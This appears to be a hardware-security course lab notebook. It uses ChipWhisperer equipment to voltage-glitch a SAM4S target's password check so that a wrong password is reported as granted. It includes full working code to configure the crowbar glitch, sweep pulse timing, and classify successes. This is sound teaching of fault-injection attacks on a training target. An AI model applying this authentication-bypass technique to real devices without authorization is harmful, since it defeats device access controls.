# Week 6 Lab - Glitch the password check (voltage)

Send the **wrong** password and voltage-glitch the comparison so the target reports access **granted**
(`passok = 1`). Same crowbar injector as week 5's voltage lab, aimed at a conditional check instead of a
counting loop. Based on ChipWhisperer `fault101` Fault 1_2.

**Hardware:** connect the Husky's **Crowbar** SMA output to **either** of the CW313's two SMA connectors
(both tie to the target VCC / shunt line). That coax must be connected for the voltage pass. The notebook
finds your ChipWhisperer install automatically, so it runs from anywhere.

In [ ]:
SCOPETYPE = 'OPENADC'
PLATFORM  = 'CW312_SAM4S'
SS_VER    = 'SS_VER_2_1'

In [ ]:
# Locate the ChipWhisperer install from the installed package, so this notebook
# runs from anywhere - it does not need to sit inside the chipwhisperer tree.
import os, chipwhisperer as cw
CWROOT = os.path.normpath(os.path.join(os.path.dirname(cw.__file__), "..", ".."))
SETUP  = os.path.join(CWROOT, "jupyter", "Setup_Scripts", "Setup_Generic.ipynb")
FW_SRC = os.path.join(CWROOT, "firmware", "mcu", "simpleserial-glitch")
# drive-less, forward-slash root for the %%bash build cell; the cell itself finds
# the right mount prefix (/mnt/c on WSL, /c on Git-Bash, / on macOS/Linux).
CW_BASH = (CWROOT[0].lower() + CWROOT[2:].replace("\\", "/")) if os.name == "nt" else CWROOT.lstrip("/")
print("ChipWhisperer:", CWROOT)

In [ ]:
%run "$SETUP"    # brings up scope, prog, target

In [ ]:
%%bash -s "$PLATFORM" "$SS_VER" "$CW_BASH"
# find the firmware dir under whichever mount this bash uses (WSL /mnt/c, Git-Bash /c, macOS /)
FW=""
for p in "/mnt/$3" "/$3"; do
  [ -d "$p/firmware/mcu/simpleserial-glitch" ] && FW="$p/firmware/mcu/simpleserial-glitch" && break
done
[ -z "$FW" ] && { echo "firmware dir not found for root: $3" >&2; exit 1; }
cd "$FW"
make PLATFORM=$1 CRYPTO_TARGET=NONE SS_VER=$2 -j

In [ ]:
fw_path = os.path.join(FW_SRC, "simpleserial-glitch-{}.hex".format(PLATFORM))
cw.program_target(scope, prog, fw_path)
if SS_VER == 'SS_VER_2_1':
    target.reset_comms()

In [ ]:
def reboot_flush():
    scope.io.nrst = False
    time.sleep(0.05)
    scope.io.nrst = "high_z"
    time.sleep(0.05)
    target.flush()

## The code we are glitching

The `'p'` command runs this on the target:

```c
uint8_t password(uint8_t* pw, uint8_t len)
{
    char passwd[] = "touch";
    char passok = 1;
    int cnt;
    trigger_high();
    for(cnt = 0; cnt < 5; cnt++){
        if (pw[cnt] != passwd[cnt]){
            passok = 0;
        }
    }
    trigger_low();
    simpleserial_put('r', 1, (uint8_t*)&passok);
    return 0x00;
}
```

`passok` starts at 1 and is set to 0 as soon as any character differs from `"touch"`. Send a wrong
password and it answers `passok = 0` (denied). A fault that stops that store - or skips the compare -
leaves `passok = 1` on a wrong password: access granted. `trigger_high()/trigger_low()` bracket the
compare, so `ext_offset` counts cycles into it.

## Baseline: right password granted, wrong denied

Confirm the check behaves before attacking it. `'p'` takes exactly 5 bytes and returns one byte,
`passok`. The wrong password here differs from `"touch"` in its last character only.

In [ ]:
import struct
WRONG = b"toucx"   # wrong by one character - the single store of passok=0 is the point to glitch

def try_password(pw):
    target.simpleserial_write('p', bytearray(pw))
    val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)
    if not val['valid'] or val['payload'] is None:
        return None
    return val['payload'][0]   # passok

print("correct 'touch':", try_password(b"touch"))   # expect 1 (granted)
print("wrong  ", WRONG, ":", try_password(WRONG))    # expect 0 (denied)

## Set up voltage glitching (crowbar)

Same crowbar setup as week 5's voltage lab. `output='enable_only'` holds the crowbar on for a **full
clock cycle** per glitch (repeated `scope.glitch.repeat` cycles); on this SAM4S the sub-cycle
`glitch_only` pulse only resets or does nothing. `glitch_hp` / `glitch_lp` enable both crowbar MOSFETs.
In `enable_only` the knobs are `repeat` (pulse length in cycles) and `ext_offset` (where in the compare
the pulse lands); `width` and `offset` do nothing.

In [ ]:
if scope._is_husky:
    scope.glitch.enabled = True
    scope.glitch.clk_src = "pll"
else:
    scope.glitch.clk_src = "clkgen"
scope.glitch.output = "enable_only"   # full-cycle crowbar pulse; glitch_only can't corrupt this SAM4S
scope.glitch.trigger_src = "ext_single"
scope.io.glitch_hp = True
scope.io.glitch_lp = True             # both crowbar MOSFETs
if scope._is_husky:
    scope.glitch.enabled = True       # re-enable in case a setting cleared it
print("enabled:", scope.glitch.enabled, "| output:", scope.glitch.output)

## Glitch controller and live map

`gc` keeps the live counters; the next cell builds the bokeh live map (a `BokehModel` ipywidget, which
streams in VS Code). It plots `ext_offset` (where in the compare the pulse lands) against `repeat` (pulse
length in cycles). Green `+` success (granted on a wrong password), red `x` reset, light-gray dots the
swept background (denied). Click a legend entry to hide that layer. Run both before the campaign.

In [ ]:
gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["repeat", "ext_offset"])
gc.display_stats()

In [ ]:
# Live bokeh map - updates per shot in VS Code.
from bokeh.io import output_notebook
from bokeh.plotting import figure
from bokeh.models import ColumnDataSource
from jupyter_bokeh import BokehModel
from IPython.display import display
output_notebook()

src_normal  = ColumnDataSource(dict(x=[], y=[]))
src_reset   = ColumnDataSource(dict(x=[], y=[]))
src_success = ColumnDataSource(dict(x=[], y=[]))

live_p = figure(width=820, height=600, title="Password-check voltage-glitch map",
                x_axis_label="ext_offset", y_axis_label="repeat")
live_p.scatter("x", "y", source=src_normal,  size=3,  color="lightgray",          legend_label="denied")
live_p.scatter("x", "y", source=src_reset,   size=9,  marker="x",     color="red",   legend_label="reset")
live_p.scatter("x", "y", source=src_success, size=12, marker="cross", color="green", legend_label="granted")
live_p.legend.click_policy = "hide"
display(BokehModel(live_p))

_live_src = {"normal": src_normal, "reset": src_reset, "success": src_success}

def live_add(group, ext_offset, repeat):
    _live_src[group].stream(dict(x=[ext_offset], y=[repeat]))

## Campaign - sweep until a wrong password is granted

Each shot sends the **wrong** password through the crowbar in `enable_only` mode, classifies the answer,
and streams it onto the map.

- **`repeat`** is the pulse length in whole cycles. The compare is short, so start small (1-6). `width` /
  `offset` do nothing in `enable_only`.
- **`ext_offset`** is swept across the compare window (the 5-character loop is only tens of cycles long,
  so a shallow sweep is right here - unlike week 5's 2500-count loop).
- **`scope.io.vglitch_reset()`** discharges the crowbar after every shot.

Buckets: **granted** = `passok == 1` on the wrong password (the fault we want), **denied** = `passok == 0`
(normal), **reset** = no / invalid answer (crash). Tune `repeats` / `exts` and read your own map; the exact
band shifts between boards and runs.

In [ ]:
import struct, random, time

# --- campaign knobs: raise these to run longer / collect more ---
PASSES      = 3     # how many full sweeps of the grid
MAX_MINUTES = 15    # hard wall-clock cap (stops on whichever comes first)
# ----------------------------------------------------------------

cw.set_all_log_levels(cw.logging.CRITICAL)
if scope._is_husky:
    scope.glitch.enabled = True
scope.adc.lo_gain_errors_disabled = True
scope.adc.clip_errors_disabled = True
scope.adc.timeout = 0.5

# enable_only: width/offset do nothing. Sweep repeat (pulse length) and ext_offset (position in the compare).
repeats = [1, 2, 3, 4, 5, 6]
exts    = list(range(0, 200))
grid = [(r, e) for r in repeats for e in exts]

tally = {"success": 0, "reset": 0, "normal": 0}
deadline = time.time() + MAX_MINUTES * 60
t0 = time.time()
n = 0
reboot_flush()
stop = False
for p in range(PASSES):
    random.shuffle(grid)                 # fresh order each pass
    for r, e in grid:
        if time.time() > deadline:
            stop = True; break
        n += 1
        if scope.adc.state:              # trigger still high from a crash
            reboot_flush()
        scope.glitch.repeat, scope.glitch.ext_offset = r, e
        scope.arm()
        target.simpleserial_write('p', bytearray(WRONG))
        ret = scope.capture()
        scope.io.vglitch_reset()         # discharge the crowbar after every shot
        if ret:                          # no trigger -> crashed
            group = "reset"
        else:
            val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10, timeout=50)
            if not val['valid'] or val['payload'] is None:
                group = "reset"
            else:
                passok = val['payload'][0]
                if passok == 1:
                    group = "success"
                    print(f"GRANTED: wrong password {WRONG} -> passok=1  (repeat={r}, ext_offset={e})")
                else:
                    group = "normal"
        tally[group] += 1
        gc.add(group, (r, e))
        live_add(group, e, r)
        if group == "reset":
            reboot_flush()
        if n % 500 == 0:
            print(f"{n:6d} shots | {time.time()-t0:4.0f}s | "
                  f"granted={tally['success']:4d} reset={tally['reset']:4d} denied={tally['normal']:5d}")
    if stop:
        break

el = time.time() - t0
print(f"\nDONE: {n} shots in {el:.0f}s ({n/max(el,1):.0f}/s), {p+1} pass(es)")
print("tally:", tally, "| grant rate: %.2f%%" % (100 * tally['success'] / max(n, 1)))

## Results

The per-setting table, sorted by success rate (ext_offset collapsed) - read the working `repeat` from it.
The live map above shows where in the compare (ext_offset) the grants land.

In [ ]:
results = gc.calc(ignore_params="ext_offset", sort="success_rate")
results

## Submission

Show three things: the working parameters (`repeat` / `ext_offset`), a read where the **wrong** password
returned `passok = 1`, and the working range from the map.

> A single hit is luck. A range is a result.

In [ ]:
scope.dis()
target.dis()